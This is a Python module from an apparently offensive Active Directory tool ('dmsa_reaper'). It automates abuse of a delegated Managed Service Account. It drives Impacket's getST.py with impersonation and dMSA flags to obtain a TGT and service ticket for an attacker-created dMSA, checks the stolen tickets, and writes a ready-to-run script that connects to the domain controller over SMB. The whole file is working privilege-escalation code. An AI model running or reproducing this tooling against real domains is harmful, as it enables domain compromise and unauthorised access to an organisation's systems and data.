from __future__ import annotations

import json
import os
import re
import shutil
import shlex
import subprocess
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from impacket.krb5.ccache import CCache

from dmsa_reaper.models import Operation


class TicketAcquisitionError(RuntimeError):
    pass


def _utc_now_iso() -> str:
    return (
        datetime.now(timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


def _pretty(principal: Any) -> str:
    value = principal.prettyPrint()
    return value.decode("utf-8", errors="replace") if isinstance(value, bytes) else str(value)


def _principal_name(value: str) -> str:
    return value.split("@", 1)[0].lower()


def validate_ccache(
    path: Path,
    *,
    expected_client: str,
    expected_service: str,
    created_after: float,
) -> dict[str, Any]:
    """Cryptographically parse and bind a fresh cache to client and service names."""
    if not path.is_file() or path.stat().st_size == 0:
        raise TicketAcquisitionError("Impacket did not produce a non-empty ccache")
    if path.stat().st_mtime + 1 < created_after:
        raise TicketAcquisitionError("ccache predates this ticket request")
    try:
        cache = CCache.loadFile(str(path))
    except Exception as exc:
        raise TicketAcquisitionError(f"produced artifact is not a valid ccache: {exc}") from exc
    if not cache.credentials:
        raise TicketAcquisitionError("produced ccache contains no credentials")

    now = int(time.time())
    clients: list[str] = []
    services: list[str] = []
    expiries: list[int] = []
    for credential in cache.credentials:
        client = _pretty(credential["client"])
        service = _pretty(credential["server"])
        clients.append(client)
        services.append(service)
        endtime = int(credential["time"]["endtime"])
        expiries.append(endtime)
    if any(_principal_name(client) != expected_client.lower() for client in clients):
        raise TicketAcquisitionError(
            f"ccache client does not match created dMSA {expected_client!r}"
        )
    expected = expected_service.lower()
    if not any(_principal_name(service) == expected for service in services):
        raise TicketAcquisitionError(
            f"ccache does not contain the requested service {expected_service!r}"
        )
    if max(expiries) <= now:
        raise TicketAcquisitionError("ccache credentials are expired")
    return {
        "client": clients[0],
        "services": services,
        "expires_at": datetime.fromtimestamp(max(expiries), timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z"),
        "size": path.stat().st_size,
    }


def _failure_class(stdout: str, stderr: str, returncode: int) -> str:
    combined = f"{stdout}\n{stderr}"
    match = re.search(r"KDC_ERR_[A-Z_]+", combined)
    if match:
        return match.group(0)
    lowered = combined.lower()
    if "clock skew" in lowered:
        return "clock-skew"
    if "name or service not known" in lowered or "dns" in lowered:
        return "dns"
    if returncode:
        return f"impacket-exit-{returncode}"
    return "no-valid-ccache"


def _run_getst(
    executable: str,
    args: list[str],
    *,
    cwd: Path,
    ccache: Path,
) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env["KRB5CCNAME"] = str(ccache.resolve())
    return subprocess.run(
        [executable, *args],
        cwd=cwd,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )


def _single_created_cache(stage: Path) -> Path:
    caches = list(stage.glob("*.ccache"))
    if len(caches) != 1:
        raise TicketAcquisitionError(
            f"expected exactly one new ccache from Impacket, found {len(caches)}"
        )
    return caches[0]


def acquire_dmsa_ticket(
    operation: Operation,
    *,
    source_ccache: Path,
    identity: str,
    domain: str,
    service: str,
    dc_ip: str | None = None,
    runs_dir: Path = Path(".reaper/runs"),
    getst_executable: str | None = None,
) -> dict[str, Any]:
    """Use Impacket's dMSA flow, validate both caches, and create handoff artifacts."""
    if operation.status != "executed" or operation.cleaned_up:
        raise TicketAcquisitionError("ticket acquisition requires an active executed operation")
    if not operation.verified_ldap:
        raise TicketAcquisitionError("LDAP relationship must be verified before ticket acquisition")
    dmsa_sam = str(operation.metadata.get("created_dmsa_sam") or "")
    if not dmsa_sam:
        raise TicketAcquisitionError("operation has no created dMSA sAMAccountName")
    if not source_ccache.is_file():
        raise TicketAcquisitionError(f"source ccache does not exist: {source_ccache}")
    executable = getst_executable or shutil.which("getST.py")
    if not executable:
        raise TicketAcquisitionError("Impacket getST.py is not installed on PATH")

    run_dir = (runs_dir / operation.id).resolve()
    run_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
    os.chmod(run_dir, 0o700)
    stage = Path(tempfile.mkdtemp(prefix=".ticket-stage-", dir=run_dir))
    started = time.time()
    dc_args = ["-dc-ip", dc_ip] if dc_ip else []
    try:
        first = _run_getst(
            executable,
            [
                "-k",
                "-no-pass",
                "-impersonate",
                dmsa_sam,
                "-self",
                "-dmsa",
                *dc_args,
                f"{domain}/{identity}",
            ],
            cwd=stage,
            ccache=source_ccache,
        )
        try:
            produced_tgt = _single_created_cache(stage)
            tgt_meta = validate_ccache(
                produced_tgt,
                expected_client=dmsa_sam,
                expected_service=f"krbtgt/{domain}",
                created_after=started,
            )
        except TicketAcquisitionError as exc:
            failure = _failure_class(first.stdout, first.stderr, first.returncode)
            raise TicketAcquisitionError(f"dMSA TGT acquisition failed ({failure}): {exc}") from exc
        tgt_path = run_dir / "created-dmsa.ccache"
        os.replace(produced_tgt, tgt_path)
        os.chmod(tgt_path, 0o600)

        service_stage = stage / "service"
        service_stage.mkdir(mode=0o700)
        service_started = time.time()
        second = _run_getst(
            executable,
            ["-k", "-no-pass", "-spn", service, *dc_args, f"{domain}/{dmsa_sam}"],
            cwd=service_stage,
            ccache=tgt_path,
        )
        try:
            produced_service = _single_created_cache(service_stage)
            service_meta = validate_ccache(
                produced_service,
                expected_client=dmsa_sam,
                expected_service=service,
                created_after=service_started,
            )
        except TicketAcquisitionError as exc:
            failure = _failure_class(second.stdout, second.stderr, second.returncode)
            raise TicketAcquisitionError(f"service-ticket validation failed ({failure}): {exc}") from exc
        service_path = run_dir / "test-service.ccache"
        os.replace(produced_service, service_path)
        os.chmod(service_path, 0o600)

        use_path = run_dir / "use-ticket.sh"
        dc_target = operation.metadata.get("dc_host") or service.split("/", 1)[-1]
        dc_ip_arg = f" -target-ip {shlex.quote(dc_ip)}" if dc_ip else ""
        use_path.write_text(
            "#!/bin/sh\n"
            f"export KRB5CCNAME={shlex.quote(str(tgt_path))}\n"
            f"smbclient.py -k -no-pass{dc_ip_arg} "
            f"{shlex.quote(f'{domain}/{dmsa_sam}@{dc_target}')}\n",
            encoding="utf-8",
        )
        os.chmod(use_path, 0o700)

        result = {
            "status": "verified",
            "verified_at": _utc_now_iso(),
            "client": tgt_meta["client"],
            "target": operation.metadata.get("target_dn")
            or (operation.metadata.get("path") or {}).get("target_dn"),
            "service": service,
            "tgt_ccache": str(tgt_path),
            "service_ccache": str(service_path),
            "use_script": str(use_path),
            "tgt": tgt_meta,
            "service_ticket": service_meta,
        }
        summary_path = run_dir / "summary.json"
        summary_path.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        os.chmod(summary_path, 0o600)
        operation_path = run_dir / "operation.json"
        operation_path.write_text(operation.model_dump_json(indent=2) + "\n", encoding="utf-8")
        os.chmod(operation_path, 0o600)
        return result
    finally:
        shutil.rmtree(stage, ignore_errors=True)
